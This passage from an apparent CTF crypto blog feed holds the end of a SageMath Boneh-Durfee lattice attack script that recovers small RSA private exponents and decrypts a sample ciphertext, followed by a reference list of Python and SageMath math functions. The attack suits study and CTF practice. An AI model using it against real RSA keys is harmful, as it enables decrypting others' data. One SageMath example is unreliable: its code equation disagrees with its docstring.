= BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span>    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.270</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] d:&quot;</span> + <span class="built_in">str</span>(d))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] m:&quot;</span> + <span class="built_in">str</span>(m))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== ALL DONE!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure>



<h1 id="Addiction"><a href="#Addiction" class="headerlink" title="Addiction"></a>Addiction</h1><p>When we obtain the $m$, there are different ways to get <code>flag</code>.</p>
<ul>
<li>long_to_bytes()</li>
</ul>
<p>Long integer converts to bytes. </p>
<ul>
<li>ASCII</li>
</ul>
<p>The beginning of $m$ is <code>1</code>, and it may convert to some invisible characters. </p>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>factor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Functions</title>
    <url>/2022/11/15/22-11-15-functions/</url>
    <content><![CDATA[<p>To conclude the functions that I met in these years. </p>
<p>Just show that how the functions and equations </p>
<p>make a one-to-one relation. </p>
<p>Relating to <strong>python</strong>, <strong>sagemath</strong>……</p>
<span id="more"></span>

<h1 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h1><h2 id="normal"><a href="#normal" class="headerlink" title="normal"></a>normal</h2><h3 id="num-bit-length"><a href="#num-bit-length" class="headerlink" title="num.bit_length()"></a>num.bit_length()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>).bit_length()</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">num = <span class="number">1024</span></span><br><span class="line">num.bit_length()</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line"><span class="number">1024.</span>bit_length()</span><br><span class="line"><span class="comment"># error</span></span><br></pre></td></tr></table></figure>



<h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><h3 id="gcd"><a href="#gcd" class="headerlink" title="gcd()"></a>gcd()</h3><blockquote>
<p>input: gcd(a, b)</p>
<p>output: the greatest</p>
</blockquote>
<p>To solve out the greatest common factor between $a$ and $b$</p>
<h3 id="gcdext-a-b"><a href="#gcdext-a-b" class="headerlink" title="gcdext(a, b)"></a>gcdext(a, b)</h3><h3 id="invert-a-n"><a href="#invert-a-n" class="headerlink" title="invert(a, n)"></a>invert(a, n)</h3><h3 id="powmod-a-b-c"><a href="#powmod-a-b-c" class="headerlink" title="powmod(a, b, c)"></a>powmod(a, b, c)</h3><h3 id="next-prime-a"><a href="#next-prime-a" class="headerlink" title="next_prime(a)"></a>next_prime(a)</h3><h3 id="iroot"><a href="#iroot" class="headerlink" title="iroot()"></a>iroot()</h3><h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><h3 id="bytes-to-long"><a href="#bytes-to-long" class="headerlink" title="bytes_to_long()"></a>bytes_to_long()</h3><h3 id="long-to-bytes"><a href="#long-to-bytes" class="headerlink" title="long_to_bytes()"></a>long_to_bytes()</h3><h2 id="sympy"><a href="#sympy" class="headerlink" title="sympy"></a>sympy</h2><blockquote>
<p><a href="https://geek-docs.com/sympy/sympy-method/python-sympy-solve-method.html">sympy.solve()方法|极客教程 (geek-docs.com)</a></p>
</blockquote>
<h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol()"></a>symbol()</h3><blockquote>
<p>input: unknowns</p>
<p>output: defined unknowns</p>
</blockquote>
<p>Define the unknowns, such as $x$, $y$, etc.</p>
<p>Two ways to define: </p>
<ul>
<li>an unknown quantity: <code>x = Symbol(&#39;x&#39;)</code></li>
<li>more than one unknown quantity: <code>x, y = symbols(&#39;x y&#39;)</code></li>
</ul>
<h3 id="solve"><a href="#solve" class="headerlink" title="solve()"></a>solve()</h3><blockquote>
<p>input: solve([equations], [unknowns])</p>
<p>output: the root of the equations</p>
</blockquote>
<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p><strong>install</strong></p>
<ul>
<li>cmd <code>pip install z3_solver</code></li>
<li>pycharm <code>setting -&gt; python interpreter -&gt; + -&gt; search for z3_solver.eg</code></li>
</ul>
<p><strong>import</strong></p>
<ul>
<li><code>from z3 import *</code></li>
<li><code>import z3</code></li>
</ul>
<h3 id="Int-x2F-Ints"><a href="#Int-x2F-Ints" class="headerlink" title="Int()&#x2F;Ints()"></a>Int()&#x2F;Ints()</h3><blockquote>
<p>input: unknown</p>
<p>output: Integer variable. </p>
<p>eg: 3, 5, 7……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Real-x2F-Reals"><a href="#Real-x2F-Reals" class="headerlink" title="Real()&#x2F;Reals()"></a>Real()&#x2F;Reals()</h3><blockquote>
<p>input: unknown</p>
<p>output: Real variable. </p>
<p>eg: $2^{\frac{1}{2}}$……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">a, b = Reals(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><em>Same above.</em></p>
<h3 id="BitVec-x2F-BitVecs"><a href="#BitVec-x2F-BitVecs" class="headerlink" title="BitVec()&#x2F;BitVecs()"></a>BitVec()&#x2F;BitVecs()</h3><blockquote>
<p>input: bit vector unknown</p>
<p>output: bit vectors</p>
<p>eg: 11000001, 11111000……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = BitVecs(<span class="string">&#x27;a b&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Solver"><a href="#Solver" class="headerlink" title="Solver()"></a>Solver()</h3><blockquote>
<p>create a  Solver to calculate</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>

<h3 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h3><blockquote>
<p>input: equations or constraints</p>
<p>output: add to conditions</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># equ = [a + b == 10, a - b == 6]</span></span><br><span class="line">s.add(equ)</span><br></pre></td></tr></table></figure>



<h3 id="check"><a href="#check" class="headerlink" title="check()"></a>check()</h3><blockquote>
<p>to check the conditions and solve out</p>
<p>output: sat &#x2F; unsat</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.add(equ)</span></span><br><span class="line">s.check()</span><br><span class="line"><span class="comment"># sat</span></span><br></pre></td></tr></table></figure>



<h3 id="model"><a href="#model" class="headerlink" title="model()"></a>model()</h3><blockquote>
<p>solve out the satisfied roots</p>
<p>output: the roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># if the output is sat that stands for there exist roots</span></span><br><span class="line">s.model()</span><br><span class="line"><span class="comment"># [a = 8, b = 2]</span></span><br></pre></td></tr></table></figure>



<h2 id="itertools"><a href="#itertools" class="headerlink" title="itertools"></a>itertools</h2><blockquote>
<p>Traverse all possibilities</p>
</blockquote>
<blockquote>
<p><a href="https://docs.python.org/3/library/itertools.html">itertools — Functions creating iterators for efficient looping — Python 3.11.1 documentation</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br></pre></td></tr></table></figure>



<h3 id="product"><a href="#product" class="headerlink" title="product()"></a>product()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">product(<span class="string">&#x27;ABCD&#x27;</span>, repeat = <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</span></span><br></pre></td></tr></table></figure>



<h3 id="permutations"><a href="#permutations" class="headerlink" title="permutations()"></a>permutations()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">permutations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line"><span class="comment"># no repeated compared to result above</span></span><br></pre></td></tr></table></figure>



<h3 id="combinations"><a href="#combinations" class="headerlink" title="combinations()"></a>combinations()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BC BD CD</span></span><br></pre></td></tr></table></figure>



<h3 id="combinations-with-replacement"><a href="#combinations-with-replacement" class="headerlink" title="combinations_with_replacement()"></a>combinations_with_replacement()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations_with_replacement(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BB BC BD CC CD DD</span></span><br><span class="line"><span class="comment"># repeated compared to result above</span></span><br></pre></td></tr></table></figure>



<h2 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br></pre></td></tr></table></figure>



<h3 id="n2s-n"><a href="#n2s-n" class="headerlink" title="n2s(n)"></a>n2s(n)</h3><blockquote>
<p>number convert to string</p>
</blockquote>
<h3 id="s2n-s"><a href="#s2n-s" class="headerlink" title="s2n(s)"></a>s2n(s)</h3><blockquote>
<p>string convert to number</p>
</blockquote>
<h3 id="s2b-s"><a href="#s2b-s" class="headerlink" title="s2b(s)"></a>s2b(s)</h3><blockquote>
<p>string convert to binary</p>
</blockquote>
<h3 id="b2s-b"><a href="#b2s-b" class="headerlink" title="b2s(b)"></a>b2s(b)</h3><blockquote>
<p>binary convert to string</p>
</blockquote>
<h3 id="prime-n"><a href="#prime-n" class="headerlink" title="prime(n)"></a>prime(n)</h3><blockquote>
<p>produce primes &lt; &#x3D; n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">14</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">13</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure>



<h3 id="generate-prime-n"><a href="#generate-prime-n" class="headerlink" title="generate_prime(n)"></a>generate_prime(n)</h3><blockquote>
<p>generate bit_length&#x3D;n prime</p>
</blockquote>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 787</span></span><br></pre></td></tr></table></figure>



<h1 id="sagemath"><a href="#sagemath" class="headerlink" title="sagemath"></a>sagemath</h1><blockquote>
<p><a href="https://doc.sagemath.org/html/en/reference/">Reference Manual (sagemath.org)</a></p>
</blockquote>
<h2 id="var"><a href="#var" class="headerlink" title="var()"></a>var()</h2><blockquote>
<p>input: Integer</p>
<p>output:  Integer variables</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve()"></a>solve()</h2><blockquote>
<p>input: solve([equations], [variables])</p>
<p>output: roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3x-y+z=185</span></span><br><span class="line"><span class="string">2x+3y-z=321</span></span><br><span class="line"><span class="string">x+y+z=173</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br><span class="line">f1 = <span class="number">3</span>*x - y + z == <span class="number">185</span></span><br><span class="line">f2 = <span class="number">2</span>*x + <span class="number">3</span>*y - z == <span class="number">321</span></span><br><span class="line">f3 = x + y + z == <span class="number">185</span></span><br><span class="line">sol = solve([f1, f2, f3], [x, y, z])</span><br><span class="line"><span class="comment"># [[x == 74, y == 68, z == 31]]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x*x+x-7943722218936282=0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">f = x*x + x - <span class="number">7943722218936282</span></span><br><span class="line">solve([f], [x])</span><br><span class="line"><span class="comment"># [x == 89127561, x == 